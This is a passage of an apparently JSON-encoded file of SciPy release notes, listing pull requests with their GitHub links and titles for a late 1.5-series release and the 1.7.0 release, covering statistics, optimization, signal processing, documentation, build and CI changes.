<https://github.com/scipy/scipy/pull/12126>`__: TST: Cleanup unused matplotlib code.\n* `12127 <https://github.com/scipy/scipy/pull/12127>`__: DOC: update docstrings of signal.cspline2d, qspline2d, sepfir2d\n* `12130 <https://github.com/scipy/scipy/pull/12130>`__: MAINT: Fixing broken links with linkchecker\n* `12135 <https://github.com/scipy/scipy/pull/12135>`__: ENH: linalg: Add the function convolution_matrix.\n* `12136 <https://github.com/scipy/scipy/pull/12136>`__: MAINT: Cleanup np.poly1d hack\n* `12137 <https://github.com/scipy/scipy/pull/12137>`__: TST, CI: reproduce wheels 32-bit setup\n* `12140 <https://github.com/scipy/scipy/pull/12140>`__: TST: stats: add kstwo, ksone to slow tests.\n* `12141 <https://github.com/scipy/scipy/pull/12141>`__: Support 64-bit integer size in Fitpack\n* `12151 <https://github.com/scipy/scipy/pull/12151>`__: DOC: Correct Rosenbrock function sum\n* `12159 <https://github.com/scipy/scipy/pull/12159>`__: BUG: Fix length calculation in upfirdn\n* `12160 <https://github.com/scipy/scipy/pull/12160>`__: BUG: Fix M_PI\n* `12168 <https://github.com/scipy/scipy/pull/12168>`__: DOC: add an obsolete version checking javascript to doc release...\n* `12171 <https://github.com/scipy/scipy/pull/12171>`__: CI, MAINT: Azure OpenBLAS drive flip\n* `12172 <https://github.com/scipy/scipy/pull/12172>`__: ENH: Bounds for the Powell minimization method\n* `12175 <https://github.com/scipy/scipy/pull/12175>`__: BLD: support more Fortran compilers for ilp64 and macro expansion...\n* `12179 <https://github.com/scipy/scipy/pull/12179>`__: BUG: stats: A few distributions didn't accept lists as arguments.\n* `12180 <https://github.com/scipy/scipy/pull/12180>`__: MAINT: removed redundant import in SphericalVoronoi tests\n* `12181 <https://github.com/scipy/scipy/pull/12181>`__: DOC: for versionwarning don't use $.getScript\n* `12182 <https://github.com/scipy/scipy/pull/12182>`__: MAINT: random sampling on the hypersphere in SphericalVoronoi...\n* `12194 <https://github.com/scipy/scipy/pull/12194>`__: MAINT: Module and example cleanups for doc build\n* `12202 <https://github.com/scipy/scipy/pull/12202>`__: ENH: tool to DL release wheels from Anaconda\n* `12210 <https://github.com/scipy/scipy/pull/12210>`__: Remove py.typed marker (at least for the release)\n* `12217 <https://github.com/scipy/scipy/pull/12217>`__: BUG: stats: Fix handling of edge cases in median_abs_deviation.\n* `12223 <https://github.com/scipy/scipy/pull/12223>`__: BUG: stats: wilcoxon returned p > 1 for certain inputs.\n* `12227 <https://github.com/scipy/scipy/pull/12227>`__: BLD: Set macos min version when building rectangular_lsap\n* `12229 <https://github.com/scipy/scipy/pull/12229>`__: MAINT: tools/gh_lists.py: fix http header case sensitivity issue\n* `12236 <https://github.com/scipy/scipy/pull/12236>`__: DOC: Fix a couple grammatical mistakes in 1.5.0-notes.rst.\n* `12276 <https://github.com/scipy/scipy/pull/12276>`__: TST: skip `test_heequb`, it fails intermittently.\n* `12285 <https://github.com/scipy/scipy/pull/12285>`__: CI: split travis arm64 run into two\n* `12317 <https://github.com/scipy/scipy/pull/12317>`__: BUG: prevent error accumulation in `Rotation` multiplication\n* `12318 <https://github.com/scipy/scipy/pull/12318>`__: BUG: sparse: avoid np.prod overflow in check_shape\n* `12319 <https://github.com/scipy/scipy/pull/12319>`__: BUG: Make cobyla threadsafe\n* `12335 <https://github.com/scipy/scipy/pull/12335>`__: MAINT: Work around Sphinx bug\n\n\n\n==========================\n", "1.7.0": "***********************\n\n* `4824 <https://github.com/scipy/scipy/pull/4824>`__: Permutation Ttest (new PR)\n* `4933 <https://github.com/scipy/scipy/pull/4933>`__: ENH: Update the Mann-Whitney-Wilcoxon test\n* `7702 <https://github.com/scipy/scipy/pull/7702>`__: ENH: stats: Add Skewed Cauchy Distribution\n* `8306 <https://github.com/scipy/scipy/pull/8306>`__: Optional Pythran support for scipy.signal.max_len_seq_inner\n* `10170 <https://github.com/scipy/scipy/pull/10170>`__: MAINT: stats: Implement cdf and ppf as ufuncs for the cosine...\n* `10454 <https://github.com/scipy/scipy/pull/10454>`__: ENH: Extend find_peaks_cwt to take numbers and iterables for...\n* `10844 <https://github.com/scipy/scipy/pull/10844>`__: ENH: add stats.qmc module with quasi Monte Carlo functionality\n* `11313 <https://github.com/scipy/scipy/pull/11313>`__: ENH: add Wright's generalized Bessel function\n* `11352 <https://github.com/scipy/scipy/pull/11352>`__: ENH: stats: Add crosstab function.\n* `11477 <https://github.com/scipy/scipy/pull/11477>`__: FIX: bounded parameter in cdfchn.f gives bad results\n* `11695 <https://github.com/scipy/scipy/pull/11695>`__: ENH: stats: add method of moments to \\`rv_continuous.fit\\`\n* `11911 <https://github.com/scipy/scipy/pull/11911>`__: ENH: Added bounds to boxcox and boxcox_normmax\n* `12438 <https://github.com/scipy/scipy/pull/12438>`__: BUG: use ellipkm1 in elliptical filter design to prevent numerical...\n* `12531 <https://github.com/scipy/scipy/pull/12531>`__: ENH: stats: add Page's L test\n* `12603 <https://github.com/scipy/scipy/pull/12603>`__: ENH: stats: Add \\`binomtest\\` to replace \\`binom_test\\`.\n* `12653 <https://github.com/scipy/scipy/pull/12653>`__: ENH: stats: add Somers' D test\n* `12676 <https://github.com/scipy/scipy/pull/12676>`__: BUG: update median averaging in signal.csd\n* `12760 <https://github.com/scipy/scipy/pull/12760>`__: BUG: special: erfinv(x<<1) loses precision\n* `12801 <https://github.com/scipy/scipy/pull/12801>`__: ENH: Add single-sided p-values to remaining spearmanr and linregress\n* `12873 <https://github.com/scipy/scipy/pull/12873>`__: ENH: Stats: add Alexander Govern Test\n* `13008 <https://github.com/scipy/scipy/pull/13008>`__: ENH: Add 'alternative' to functions using normal CDF for p-value\n* `13040 <https://github.com/scipy/scipy/pull/13040>`__: BUG: Allow RectSphereBivariateSpline to accept negative longitude\n* `13048 <https://github.com/scipy/scipy/pull/13048>`__: ENH: stats: Add a function that computes the relative risk.\n* `13067 <https://github.com/scipy/scipy/pull/13067>`__: ENH: Add weights parameter to stats.gmean\n* `13084 <https://github.com/scipy/scipy/pull/13084>`__: ENH: fast Hankel transform\n* `13104 <https://github.com/scipy/scipy/pull/13104>`__: MAINT: upgrade python version (drop python 3.6) for docker dev...\n* `13153 <https://github.com/scipy/scipy/pull/13153>`__: ENH: added association measurements Pearsons Contingency Coefficient,...\n* `13166 <https://github.com/scipy/scipy/pull/13166>`__: ENH: stats: Add nan_policy to zmap.\n* `13175 <https://github.com/scipy/scipy/pull/13175>`__: MAINT: tests for tall cost matrices in \\`linear_sum_assignment\\`\n* `13177 <https://github.com/scipy/scipy/pull/13177>`__: BUG: raise NotImplementedError in fourier_ellipsoid when ndim...\n* `13184 <https://github.com/scipy/scipy/pull/13184>`__: BUG: stats: Fix min and max calculation of mstats.describe with...\n* `13188 <https://github.com/scipy/scipy/pull/13188>`__: DOC: stats: make null and alternative hypotheses of kstest more...\n* `13193 <https://github.com/scipy/scipy/pull/13193>`__: MAINT: stats: chisquare check sum of observed/expected frequencies\n* `13197 <https://github.com/scipy/scipy/pull/13197>`__: ENH/MAINT: HiGHS upstream enhancements and bug fixes\n* `13198 <https://github.com/scipy/scipy/pull/13198>`__: ENH: allow inference of output_shape from out array in affine_transform\n* `13204 <https://github.com/scipy/scipy/pull/13204>`__: ENH: stats: add Zipfian (different from Zipf/zeta) distribution\n* `13208 <https://github.com/scipy/scipy/pull/13208>`__: REL: set version to 1.7.0.dev0\n* `13216 <https://github.com/scipy/scipy/pull/13216>`__: TST: stats: break up and mark slow tests\n* `13224 <https://github.com/scipy/scipy/pull/13224>`__: Update docs for the weighted \u03c4\n* `13230 <https://github.com/scipy/scipy/pull/13230>`__: ENH: linalg: Add LAPACK wrapper for tgexc.\n* `13232 <https://github.com/scipy/scipy/pull/13232>`__: MAINT: stats: raise error when input to kruskal has >1 dim\n* `13233 <https://github.com/scipy/scipy/pull/13233>`__: DOC: stats: fix MGF of arcsine and entropy of t in tutorial\n* `13236 <https://github.com/scipy/scipy/pull/13236>`__: MAINT: reorganize shared linear assignment tests\n* `13237 <https://github.com/scipy/scipy/pull/13237>`__: BENCH: Refactor stats.Distribution to easily add new distributions\n* `13238 <https://github.com/scipy/scipy/pull/13238>`__: BUG: stats: fix wrong shape output of burr and fisk distributions\n* `13240 <https://github.com/scipy/scipy/pull/13240>`__: MAINT: add tests of trivial cost matrices for linear sum assignment\n* `13252 <https://github.com/scipy/scipy/pull/13252>`__: DOC: optimize: add \\`optimize.linear_sum_assignment\\` tutorial.\n* `13254 <https://github.com/scipy/scipy/pull/13254>`__: BUG: Fix precision issues for constant input in skew and kurtosis\n* `13262 <https://github.com/scipy/scipy/pull/13262>`__: BUG: scipy.medfilt and .medfilt2d fixes\n* `13263 <https://github.com/scipy/scipy/pull/13263>`__: ENH: add Cramer-von Mises test for two samples\n* `13264 <https://github.com/scipy/scipy/pull/13264>`__: fix a minor typo in \\`stats.anderson\\` doc\n* `13268 <https://github.com/scipy/scipy/pull/13268>`__: ENH: stats: Add implementation of _entropy for the t distr.\n* `13273 <https://github.com/scipy/scipy/pull/13273>`__: DOC: stats: fix typo in Yeo-Johnson LL function documentation\n* `13275 <https://github.com/scipy/scipy/pull/13275>`__: MAINT: stats: Correct a comment in the _fitstart method of gamma.\n* `13283 <https://github.com/scipy/scipy/pull/13283>`__: BUG: stats: fix the cdf method of rv_discrete class\n* `13286 <https://github.com/scipy/scipy/pull/13286>`__: DOC: stats: clairify rv_continuous/discrete.stats example\n* `13288 <https://github.com/scipy/scipy/pull/13288>`__: DOC: stats: discrete distribution shape parameter restrictions\n* `13289 <https://github.com/scipy/scipy/pull/13289>`__: MAINT: fix a build warning in sigtoolsmodule.c\n* `13290 <https://github.com/scipy/scipy/pull/13290>`__: DOC: Expand the discussion of the nan_policy API.\n* `13291 <https://github.com/scipy/scipy/pull/13291>`__: MAINT: signal, stats: Use keepdims where appropriate.\n* `13292 <https://github.com/scipy/scipy/pull/13292>`__: DOC: stats: note another common parameterization of nbinom\n* `13293 <https://github.com/scipy/scipy/pull/13293>`__: DOC: Change broken link for default values to archived link\n* `13295 <https://github.com/scipy/scipy/pull/13295>`__: BUG: stats: fix the support method to return correct bounds\n* `13296 <https://github.com/scipy/scipy/pull/13296>`__: DOC: stats: Fix latex markup in the kstwo docstring.\n* `13297 <https://github.com/scipy/scipy/pull/13297>`__: TST: mark kde.logpdf overflow test as xslow\n* `13298 <https://github.com/scipy/scipy/pull/13298>`__: Generalized Hyperbolic Distribution\n* `13301 <https://github.com/scipy/scipy/pull/13301>`__: DOC: cluster: Add cluster number note to the docstring of cluster.vq.kmeans\n* `13302 <https://github.com/scipy/scipy/pull/13302>`__: BUG: Fix ndimage.morphology.distance_transform\\_\\* argument handling\n* `13303 <https://github.com/scipy/scipy/pull/13303>`__: CI: prevent Codecov giving false CI failures and wrong PR annotations\n* `13313 <https://github.com/scipy/scipy/pull/13313>`__: ENH: static typing for qhull\n* `13316 <https://github.com/scipy/scipy/pull/13316>`__: Pythran implementation of scipy.signal._spectral\n* `13317 <https://github.com/scipy/scipy/pull/13317>`__: DOC: forward port 1.6.0 relnotes\n* `13319 <https://github.com/scipy/scipy/pull/13319>`__: ENH: stats: add fast numerical inversion of distribution CDF\n* `13320 <https://github.com/scipy/scipy/pull/13320>`__: ENH: x0 for differential_evolution\n* `13324 <https://github.com/scipy/scipy/pull/13324>`__: DOC correct linprog highs versionadded to 1.6\n* `13326 <https://github.com/scipy/scipy/pull/13326>`__: MAINT: update numpydoc to v1.1.0\n* `13327 <https://github.com/scipy/scipy/pull/13327>`__: DOC: interpolate: improved docstring examples of \\`interpolate.interpn()\\`...\n* `13328 <https://github.com/scipy/scipy/pull/13328>`__: ENH: Boost stats distributions\n* `13330 <https://github.com/scipy/scipy/pull/13330>`__: ENH: stats: add noncentral hypergeometric distributions (Fisher's...\n* `13331 <https://github.com/scipy/scipy/pull/13331>`__: MAINT/ENH: resolve mypy warnings/errors\n* `13332 <https://github.com/scipy/scipy/pull/13332>`__: DOC: interpolate: improved docstring of \\`interpolate.interp2d\\`...\n* `13333 <https://github.com/scipy/scipy/pull/13333>`__: ENH: stats: Some more _sf and _isf implementations.\n* `13334 <https://github.com/scipy/scipy/pull/13334>`__: MAINT: stats: Clean up a few defunct comments in _continuous_distns.py\n* `13336 <https://github.com/scipy/scipy/pull/13336>`__: Pythran version of scipy.optimize._group_columns\n* `13337 <https://github.com/scipy/scipy/pull/13337>`__: DOC|ENH: type hinting in scipy.integrate.simpson\n* `13346 <https://github.com/scipy/scipy/pull/13346>`__: ENH: stats: add 'ddof' parameter to the 'variation' function\n* `13355 <https://github.com/scipy/scipy/pull/13355>`__: ENH: stats: implement _logpdf, _sf and _isf for loggamma.\n* `13360 <https://github.com/scipy/scipy/pull/13360>`__: ENH|DOC: fix docstring and input validation in interpolate.RectSphereBivariateSpline\n* `13366 <https://github.com/scipy/scipy/pull/13366>`__: BUG: stats: Don't raise ZeroDivisionError in _unequal_var_ttest_denom\n* `13370 <https://github.com/scipy/scipy/pull/13370>`__: ENH: fix ARGUS distribution for small parameters in stats\n* `13371 <https://github.com/scipy/scipy/pull/13371>`__: ENH: stats: add \\`bootstrap\\` for estimating confidence interval...\n* `13373 <https://github.com/scipy/scipy/pull/13373>`__: BUG: io/matlab: preserve dimensions of empty >=2D arrays\n* `13374 <https://github.com/scipy/scipy/pull/13374>`__: ENH: stats: add skewed Cauchy distribution\n* `13379 <https://github.com/scipy/scipy/pull/13379>`__: BUG: sparse: fix verbosity in sparse lsqr\n* `13383 <https://github.com/scipy/scipy/pull/13383>`__: TST: stats: mark many dimension permutation t-test slow\n* `13384 <https://github.com/scipy/scipy/pull/13384>`__: MAINT: Make keywords array static\n* `13388 <https://github.com/scipy/scipy/pull/13388>`__: PERF: Avoid duplicate mean calculations in skew and kurtosis\n* `13389 <https://github.com/scipy/scipy/pull/13389>`__: DOC: Fix deprecated directive syntax\n* `13390 <https://github.com/scipy/scipy/pull/13390>`__: DOC: Correct line length for Parameter Section underline\n* `13393 <https://github.com/scipy/scipy/pull/13393>`__: MAINT: stats: allow wishart dim - 1 < df < dim\n* `13395 <https://github.com/scipy/scipy/pull/13395>`__: DOC: fix typo in setup.py warning message\n* `13396 <https://github.com/scipy/scipy/pull/13396>`__: BUG: Fix MLE for Nakagami \\`nakagami_gen.fit\\`\n* `13397 <https://github.com/scipy/scipy/pull/13397>`__: MAINT:linalg: Fix tgsen family wrapper and ordqz\n* `13406 <https://github.com/scipy/scipy/pull/13406>`__: TST: add error handling tests for sparse BSR ctor\n* `13413 <https://github.com/scipy/scipy/pull/13413>`__: DOC: ultra-quickstart guide\n* `13418 <https://github.com/scipy/scipy/pull/13418>`__: BUG: Fix moment returning inconsistent types and shapes\n* `13423 <https://github.com/scipy/scipy/pull/13423>`__: DOC: Update example for leaf_label_func/dendrogram\n* `13431 <https://github.com/scipy/scipy/pull/13431>`__: ENH: stats: override _rvs for nhypergeom\n* `13432 <https://github.com/scipy/scipy/pull/13432>`__: Add indicator in NDInterpolator docstring that N must be > 1\n* `13434 <https://github.com/scipy/scipy/pull/13434>`__: DOC: stats: note relationship between scaled-inv-chi2 and invgamma\n* `13436 <https://github.com/scipy/scipy/pull/13436>`__: ENH: interpolate: add input validation to check input x-y is...\n* `13441 <https://github.com/scipy/scipy/pull/13441>`__: ENH: add functionality \\`barnard_exact\\` test to scipy.stats.\n* `13443 <https://github.com/scipy/scipy/pull/13443>`__: MAINT: stats: Updates for skewcauchy\n* `13444 <https://github.com/scipy/scipy/pull/13444>`__: DOC: clarify range of \\`a\\` parameter fpr johnsonsu/johnsonsb\n* `13445 <https://github.com/scipy/scipy/pull/13445>`__: DOC: fix runtests guidelines.\n* `13446 <https://github.com/scipy/scipy/pull/13446>`__: MAINT: stats: Add _fitstart method to wrapcauchy.\n* `13447 <https://github.com/scipy/scipy/pull/13447>`__: DEV: Update development Docker image\n* `13448 <https://github.com/scipy/scipy/pull/13448>`__: ENH: Add annotations for \\`scipy.spatial.distance\\`\n* `13451 <https://github.com/scipy/scipy/pull/13451>`__: DOC: minor formatting.\n* `13458 <https://github.com/scipy/scipy/pull/13458>`__: DOC: indent see also.\n* `13460 <https://github.com/scipy/scipy/pull/13460>`__: DOC: stats: Fix link to Cramer-von Mises wikipedia article.\n* `13461 <https://github.com/scipy/scipy/pull/13461>`__: DOC: reorganize scipy.stats overview docs page\n* `13463 <https://github.com/scipy/scipy/pull/13463>`__: DOC: misc formatting fixes\n* `13466 <https://github.com/scipy/scipy/pull/13466>`__: DOC: Typo in see also s/SmoothUni/SmoothBi/g\n* `13467 <https://github.com/scipy/scipy/pull/13467>`__: DOC: optimize: add description about \\`tol\\` argument for \\`minimize\\`.\n* `13469 <https://github.com/scipy/scipy/pull/13469>`__: MAINT: Refactor optimization methods to use scipy.stats.qmc\n* `13477 <https://github.com/scipy/scipy/pull/13477>`__: CI: pin numpy to 1.19.5 for the three macOS CI jobs\n* `13478 <https://github.com/scipy/scipy/pull/13478>`__: DOC: fix typos where double :: for Sphinx directives were missing\n* `13481 <https://github.com/scipy/scipy/pull/13481>`__: CI: pin numpy to 1.19.5 in the 4 parallel Windows builds on Azure\n* `13482 <https://github.com/scipy/scipy/pull/13482>`__: CI: use numpy 1.20.0 again in macOS CI\n* `13483 <https://github.com/scipy/scipy/pull/13483>`__: DOC: Multiple documentation syntax fixes.\n* `13484 <https://github.com/scipy/scipy/pull/13484>`__: Move some pythran config from CI to setup\n* `13487 <https://github.com/scipy/scipy/pull/13487>`__: DOC: add a tutorial about scipy.stats.qmc\n* `13492 <https://github.com/scipy/scipy/pull/13492>`__: ENH: GH actions should not run on forks\n* `13493 <https://github.com/scipy/scipy/pull/13493>`__: DEV: Enable gitpod for SciPy\n* `13495 <https://github.com/scipy/scipy/pull/13495>`__: DOC One-word typo in the documentation of optimize.linprog_simplex\n* `13499 <https://github.com/scipy/scipy/pull/13499>`__: DOC: describe LSAP implementation\n* `13502 <https://github.com/scipy/scipy/pull/13502>`__: BUG: Bounds created with lists weren't working for Powell\n* `13507 <https://github.com/scipy/scipy/pull/13507>`__: MAINT, TST: stats: centralize invalid parameters list for all...\n* `13510 <https://github.com/scipy/scipy/pull/13510>`__: DOC: stats: fix small doc errors in 'multivariate_hypergeom'\n* `13513 <https://github.com/scipy/scipy/pull/13513>`__: DOC: Added math notation in examples in ltisys.py\n* `13514 <https://github.com/scipy/scipy/pull/13514>`__: ENH: simplify low_0_bit function for Sobol\n* `13515 <https://github.com/scipy/scipy/pull/13515>`__: ENH: optimize: add bound constraint support for nelder-mead solver\n* `13516 <https://github.com/scipy/scipy/pull/13516>`__: DOC: reduce LaTeX usage for johnsonb docstring\n* `13519 <https://github.com/scipy/scipy/pull/13519>`__: BLD: remove build_sphinx support from setup.py\n* `13527 <https://github.com/scipy/scipy/pull/13527>`__: TST: stats: xfail ttest_ind_randperm_alternative2 on 32 bit\n* `13530 <https://github.com/scipy/scipy/pull/13530>`__: DOC: correct comparisons between median filter functions\n* `13532 <https://github.com/scipy/scipy/pull/13532>`__: ENH: release the GIL inside medfilt2d\n* `13538 <https://github.com/scipy/scipy/pull/13538>`__: DOC: optimize: fix minor doc error in 'fmin_powell' (#13511)\n* `13546 <https://github.com/scipy/scipy/pull/13546>`__: DOC: fix list of \"mode\" options for ndimage\n* `13549 <https://github.com/scipy/scipy/pull/13549>`__: ENH: stats: add 'alternative' keyword to some normality tests.\n* `13551 <https://github.com/scipy/scipy/pull/13551>`__: MAINT: add git to docker env\n* `13552 <https://github.com/scipy/scipy/pull/13552>`__: MAINT: stats: remove float_power shim\n* `13553 <https://github.com/scipy/scipy/pull/13553>`__: DOC: use support rather than a/b in stats tutorial\n* `13560 <https://github.com/scipy/scipy/pull/13560>`__: MAINT: optimize: improve linprog error message for sparse input...\n* `13562 <https://github.com/scipy/scipy/pull/13562>`__: MAINT: optimize: using np.isclose instead of _within_tolerance.\n* `13566 <https://github.com/scipy/scipy/pull/13566>`__: ENH: Speed up hdquantiles_sd()\n* `13569 <https://github.com/scipy/scipy/pull/13569>`__: BENCH: optimize: benchmark only HiGHS methods; add bigger linprog...\n* `13574 <https://github.com/scipy/scipy/pull/13574>`__: DOC: In description of cluster.hierarchy.dendrogram 'level' parameter,...\n* `13576 <https://github.com/scipy/scipy/pull/13576>`__: ENH: improve discrepancy performance\n* `13579 <https://github.com/scipy/scipy/pull/13579>`__: TST: Add pybind11 to tox environments\n* `13583 <https://github.com/scipy/scipy/pull/13583>`__: BUG: Fix Dockerfile apt-get installs\n* `13588 <https://github.com/scipy/scipy/pull/13588>`__: MAINT: forward port 1.6.1 relnotes.\n* `13593 <https://github.com/scipy/scipy/pull/13593>`__: BUG: stats: preserve sample dtype for bin edges\n* `13595 <https://github.com/scipy/scipy/pull/13595>`__: ENH: interpolate: add RBFInterpolator\n* `13596 <https://github.com/scipy/scipy/pull/13596>`__: DOC: Fix indentation in new_stats_distribution.rst.inc\n* `13601 <https://github.com/scipy/scipy/pull/13601>`__: Add dpss for get_window function\n* `13604 <https://github.com/scipy/scipy/pull/13604>`__: DOC: Correct dual annealing visiting param range.\n* `13605 <https://github.com/scipy/scipy/pull/13605>`__: Add Codecov badge to README\n* `13607 <https://github.com/scipy/scipy/pull/13607>`__: MAINT: stats: fix crystalball entropy\n* `13611 <https://github.com/scipy/scipy/pull/13611>`__: Better argument preparation for distributions in stats package.\n* `13612 <https://github.com/scipy/scipy/pull/13612>`__: Add docker run command for Windows cmd\n* `13613 <https://github.com/scipy/scipy/pull/13613>`__: MAINT, CI: mypy: fix typing errors + add mypy to CI\n* `13616 <https://github.com/scipy/scipy/pull/13616>`__: FIX: Return correct output for invgauss.cdf when mu is very small\n* `13617 <https://github.com/scipy/scipy/pull/13617>`__: MAINT: accept numbers and iterables for width in find_peaks_cwt\n* `13620 <https://github.com/scipy/scipy/pull/13620>`__: CI: disable the mypy CI job (partial revert of gh-13613)\n* `13621 <https://github.com/scipy/scipy/pull/13621>`__: DOC: signal: use array_like for input types\n* `13622 <https://github.com/scipy/scipy/pull/13622>`__: MAINT: clean up some unused files, make \\`mypy scipy\\` pass\n* `13623 <https://github.com/scipy/scipy/pull/13623>`__: CI: enable Mypy CI job again\n* `13624 <https://github.com/scipy/scipy/pull/13624>`__: TST: test more values for \\`visiting_param\\` input to \\`dual_annealing\\`\n* `13625 <https://github.com/scipy/scipy/pull/13625>`__: Rename integrate.simps to integrate.simpsons in documentation...\n* `13631 <https://github.com/scipy/scipy/pull/13631>`__: ENH: add a \\`stats.differential_entropy\\` function\n* `13633 <https://github.com/scipy/scipy/pull/13633>`__: BUG: stats.binned_statistic_2d user function expecting arrays\n* `13641 <https://github.com/scipy/scipy/pull/13641>`__: ENH: Added degrees parameter to rotvec\n* `13645 <https://github.com/scipy/scipy/pull/13645>`__: MAINT: mypy: don't install numpy-stubs\n* `13649 <https://github.com/scipy/scipy/pull/13649>`__: BUG: sparse: csc_matrix.argmax() integer overflow\n* `13650 <https://github.com/scipy/scipy/pull/13650>`__: ENH: stats: add 'alternative' parameter to ansari\n* `13652 <https://github.com/scipy/scipy/pull/13652>`__: DOC: fix eigvalsh documentation (#13651)\n* `13654 <https://github.com/scipy/scipy/pull/13654>`__: BUG: Fix LatinHypercubes\n* `13656 <https://github.com/scipy/scipy/pull/13656>`__: DOC: Fix PCHIP references\n* `13657 <https://github.com/scipy/scipy/pull/13657>`__: TST: remove IPython warning in debug session\n* `13658 <https://github.com/scipy/scipy/pull/13658>`__: Remove spurious quotes in docstring\n* `13661 <https://github.com/scipy/scipy/pull/13661>`__: ENH: stats: improve efficiency of / fix bug in exact permutation...\n* `13667 <https://github.com/scipy/scipy/pull/13667>`__: MAINT: Make latest Docker image default\n* `13668 <https://github.com/scipy/scipy/pull/13668>`__: MAINT: add .theia/ to .gitignore\n* `13669 <https://github.com/scipy/scipy/pull/13669>`__: BLD: change SCIPY_USE_PYTHRAN default to \\`1\\`\n* `13676 <https://github.com/scipy/scipy/pull/13676>`__: ENH Small improvements for LSQR with damp\n* `13678 <https://github.com/scipy/scipy/pull/13678>`__: MAINT: add Pythran-generated files to .gitignore\n* `13679 <https://github.com/scipy/scipy/pull/13679>`__: MAINT: move the \\`conda develop .\\` in the Gitpod config\n* `13680 <https://github.com/scipy/scipy/pull/13680>`__: DOC: Add cKDTree note comparing it with KDTree\n* `13681 <https://github.com/scipy/scipy/pull/13681>`__: DOC: build doc updates on Pythran, compiled code, and cleanups\n* `13683 <https://github.com/scipy/scipy/pull/13683>`__: BUG: mmwrite correctly serializes non skew-symmetric arrays\n* `13684 <https://github.com/scipy/scipy/pull/13684>`__: FIX: fix numerical overflow in gamma.isf method\n* `13685 <https://github.com/scipy/scipy/pull/13685>`__: BUG: fix cosine distance range to 0-2\n* `13694 <https://github.com/scipy/scipy/pull/13694>`__: MAINT: fix warning emitted when NumPy version is incorrect\n* `13696 <https://github.com/scipy/scipy/pull/13696>`__: ENH: support trimming in ttest_ind\n* `13698 <https://github.com/scipy/scipy/pull/13698>`__: BUG: stats: Fix spurious warnings generated by arcsine.pdf\n* `13701 <https://github.com/scipy/scipy/pull/13701>`__: DEV: scipy.interpolate b-splines (periodic case)\n* `13702 <https://github.com/scipy/scipy/pull/13702>`__: DEP: Clean up spent deprecations in spatial.distance\n* `13703 <https://github.com/scipy/scipy/pull/13703>`__: MAINT: fix issues found by static code analysis\n* `13706 <https://github.com/scipy/scipy/pull/13706>`__: ENH: stats: Implement sf and isf for the laplace distribution.\n* `13711 <https://github.com/scipy/scipy/pull/13711>`__: MAINT: stats: fix broadcasting for scipy.stats.entropy\n* `13712 <https://github.com/scipy/scipy/pull/13712>`__: BUG: stats: Override _fitstart for the invweibull distribution.\n* `13713 <https://github.com/scipy/scipy/pull/13713>`__: DOC: update toolchain.rst to reflect windows universal C runtime\n* `13714 <https://github.com/scipy/scipy/pull/13714>`__: MAINT: stats: Remove an unused list from test_continuous_basic.py.\n* `13715 <https://github.com/scipy/scipy/pull/13715>`__: MAINT: stats: No need to suppress frechet deprecation warnings.\n* `13716 <https://github.com/scipy/scipy/pull/13716>`__: MAINT: use super() as described by PEP 3135\n* `13718 <https://github.com/scipy/scipy/pull/13718>`__: MAINT: new-style class, removing inheritance to object\n* `13721 <https://github.com/scipy/scipy/pull/13721>`__: MAINT: add a type-ignore for mpmath (#13721)\n* `13723 <https://github.com/scipy/scipy/pull/13723>`__: MAINT: mypy: ignore mpmath imports in mypy.ini\n* `13724 <https://github.com/scipy/scipy/pull/13724>`__: DOC: pydata sphinx theme\n* `13725 <https://github.com/scipy/scipy/pull/13725>`__: BENCH: add benchmark for Kendalltau\n* `13727 <https://github.com/scipy/scipy/pull/13727>`__: CI: simplify Pythran configuration setup for Azure\n* `13731 <https://github.com/scipy/scipy/pull/13731>`__: MAINT: stats: Some flake8-driven clean up.\n* `13732 <https://github.com/scipy/scipy/pull/13732>`__: ENH: stats: Studentized Range Distribution\n* `13735 <https://github.com/scipy/scipy/pull/13735>`__: DOC: correct Voronoi docstring\n* `13738 <https://github.com/scipy/scipy/pull/13738>`__: DOC: add example to wright_bessel\n* `13739 <https://github.com/scipy/scipy/pull/13739>`__: ENH: stats: Implement _sf and _isf for the chi distribution.\n* `13741 <https://github.com/scipy/scipy/pull/13741>`__: MAINT: prevent overwriting of x in minimize\n* `13747 <https://github.com/scipy/scipy/pull/13747>`__: DOC: Add note for interp1d for non-unique x-values\n* `13749 <https://github.com/scipy/scipy/pull/13749>`__: MAINT: forward port 1.6.2 relnotes\n* `13759 <https://github.com/scipy/scipy/pull/13759>`__: MAINT: simpson small performance speedups\n* `13765 <https://github.com/scipy/scipy/pull/13765>`__: FIX: npymath missing causing npy_log1p to be unknown\n* `13768 <https://github.com/scipy/scipy/pull/13768>`__: BENCH: Add missing pythran dependency\n* `13770 <https://github.com/scipy/scipy/pull/13770>`__: ENH: stats.contingency: Add the sparse option to crosstab.\n* `13774 <https://github.com/scipy/scipy/pull/13774>`__: DEP: Deprecate squeezing input vectors in spatial.distance\n* `13775 <https://github.com/scipy/scipy/pull/13775>`__: Enable trust region methods to use a finite difference Hessian...\n* `13777 <https://github.com/scipy/scipy/pull/13777>`__: DOC: Fix Ubuntu/Debian installation instructions\n* `13778 <https://github.com/scipy/scipy/pull/13778>`__: DOC: remove references to RandomState\n* `13782 <https://github.com/scipy/scipy/pull/13782>`__: MAINT: LBFGSB err msg on MAXLS changed closes #11718\n* `13785 <https://github.com/scipy/scipy/pull/13785>`__: BENCH: Add benchmark for cdist/pdist with weights\n* `13786 <https://github.com/scipy/scipy/pull/13786>`__: MAINT: Prepare cdist/pdist for C++ rework\n* `13787 <https://github.com/scipy/scipy/pull/13787>`__: MAINT: stats: move entropy and differential_entropy functions...\n* `13790 <https://github.com/scipy/scipy/pull/13790>`__: DOC: Add some dependencies for Dockerfile doc of scipy development.\n* `13792 <https://github.com/scipy/scipy/pull/13792>`__: BUG: stats: Fix broadcasting in wrapcauchy.cdf\n* `13795 <https://github.com/scipy/scipy/pull/13795>`__: MAINT: stats: add hypotests to __all__ in init.py, not stats.py\n* `13797 <https://github.com/scipy/scipy/pull/13797>`__: MAINT: stats: probplot: don't plot least-squares fit line unless...\n* `13798 <https://github.com/scipy/scipy/pull/13798>`__: MAINT: fix incorrect code comment in \\`hierarchy.to_tree\\`\n* `13802 <https://github.com/scipy/scipy/pull/13802>`__: DEV: add environment.yml file for development with conda/mamba\n* `13803 <https://github.com/scipy/scipy/pull/13803>`__: DOC: fix doc build warning about arxiv role already being registered\n* `13804 <https://github.com/scipy/scipy/pull/13804>`__: DOC+MAINT: optimize: lb and ub in the Bounds constructor are...\n* `13807 <https://github.com/scipy/scipy/pull/13807>`__: MAINT: Dont use parallel Sphinx\n* `13808 